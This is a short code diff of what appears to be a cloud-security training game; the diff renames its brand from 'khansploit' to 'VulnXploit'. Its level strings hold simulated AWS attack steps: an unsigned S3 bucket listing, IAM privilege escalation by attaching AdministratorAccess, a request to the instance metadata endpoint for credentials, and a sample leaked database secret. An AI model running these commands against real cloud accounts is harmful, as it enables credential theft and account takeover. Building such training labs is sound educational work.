@@ -6,10 +6,10 @@ function submitAWS(level, payload) {
   const isCorrect = validateAWS(id, payload);
 
   const requests = {
-    1: `aws s3 ls s3://khansploit-company-data --no-sign-request
+    1: `aws s3 ls s3://VulnXploit-company-data --no-sign-request
 
 GET / HTTP/1.1
-Host: khansploit-company-data.s3.amazonaws.com`,
+Host: VulnXploit-company-data.s3.amazonaws.com`,
     2: `aws iam create-access-key --user-name admin-user
 aws iam attach-user-policy --user-name lowpriv --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`,
     3: `GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
@@ -64,7 +64,7 @@ Risk: Critical – Instance fully exposed.`,
     5: `{
   "ARN": "arn:aws:secretsmanager:us-east-1:123456789012:secret:prod/database",
   "Name": "prod/database",
-  "SecretString": "{\\"username\\":\\"admin\\",\\"password\\":\\"Pr0d_S3cr3t_2026!\\",\\"host\\":\\"db.internal.khansploit.local\\"}",
+  "SecretString": "{\\"username\\":\\"admin\\",\\"password\\":\\"Pr0d_S3cr3t_2026!\\",\\"host\\":\\"db.internal.VulnXploit.local\\"}",
   "VersionId": "..."
 }
 
